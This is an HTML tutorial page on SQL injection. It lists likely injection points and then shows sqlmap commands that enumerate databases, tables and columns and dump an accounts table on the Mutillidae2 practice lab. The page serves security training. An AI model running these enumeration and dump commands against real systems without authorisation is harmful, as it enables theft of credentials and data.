<h1>SQL Injection</h1>
<p> SQL injection is when the User Input Data injects something that uses the context interpretation of that entered data to the attacker's advantage. It can do anything from leaking useful data like password hashes to destroying the entire database or spawn an OS shell to the attacker, if unchecked. It still remains as one of the most potent form of injections that a site can be vulnerable to as it attacks a backend datastore.
</p>
<h2> Identification</h2>
<p> Identifying the SQL injection points are the first step, every point must be checked and marked that one encounters during reconnaisance or crawling, sitemap generation etc. Key areas could be.
	<ol>
		<li>Form submissions, registrations, change password etc</li>
		<li>GET URL's typically pagination requests</li>
		<li>Ajax requests behind the scenes that periodically submit user data</li>
		<li>Feedback or comment forms in shopping sites</li>
		<li>User-Agent might be getting logged somewhere in DB, try to inject that as well</li>
	</ol>
<h2>Execution</h2>
<p>
After identifying a suitable entry point, begin your attack. It goes without saying that ensure you have full permission to perform the attack, and the client has backup of the datastore or any crucial data, as the attack could have unforseen consequences. Here we are going to practice on CTF Mutillidae2 so this can be kept aside for now.
</p>
<p>You can attack manually and when some info is revealed ,you may proceed for tools or other complex types of attack. There is no checklist , hacking is all about creativity and above all patience.
So keep digging away until you're sure that the injection point is protected.
</p>

<ol>
	<li>Manually submit values via browser interface</li>
	<ul>
		<li>Will be prevented by Client side scripting(Stupid Level 2)</li>
		<li>Not hackery enough, doesn't give you the feel good</li>
	</ul>
	<li>
		Use a good'ol script that behaves like a browser. Attached the most simple script possible in pytnon
		using Mechanize. (sqlinjection.py) for the User-Info challenge.
	</li>
	<li>
		Use the grand daddy SQLMap tool. More on how to use sqlmap can be found by reading the man page.
		SQLMap ships by default with Kali Linux.
		<ul>
			<li>
				<p>Start by locating sqlmap if it is already installed<p>
				<pre>
locate sqlmap.py
				</pre>
				Traverse to the directory, which will be "/usr/share/sqlmap" , if it is installed
			</li>
			<li>
				First step is to find out, the action URL i.e where the data is being submitted. There are many ways to do this, but I prefer doing it via the proxy of WebExploit tool BurpSuite, by PortSwigger.
				The request URL and method type must be indentified. In this case, the GET request reflects in the URL and can be copied from there. <br> In Burp Suite this can be done using the inbuilt proxy and copying th details from there. <br> We now use the URL with SQLMap as follows.<br> The values of the username and password do not matter,those keys will be used by SQLMap for injection.
				The 
				<pre>
./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs  
				</pre>
				</li>
				<li>
					The above command will display the databases that could be accessed, use "<b>-D &ltDatabaseName&gt</b>" , and <b>--tables</b>to see tables for the database.
					<pre>
./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp --tables
					</pre>
					</li>
					<li>
						Once ,tables are displayed,a table name can be selected using "<b>-T &lttableName&gt</b>" and display columns using "<b>--columns</b>"
						<pre>
./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=password&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp -T accounts --columns
						</pre>
</li>
<li>
	The data from the selected columns can be done by specifying the value "<b>-C &ltcolumn1,column2&gt</b>", and and dump the data using the option "<b>--dump</b>".
</li>
</li>
</ol>
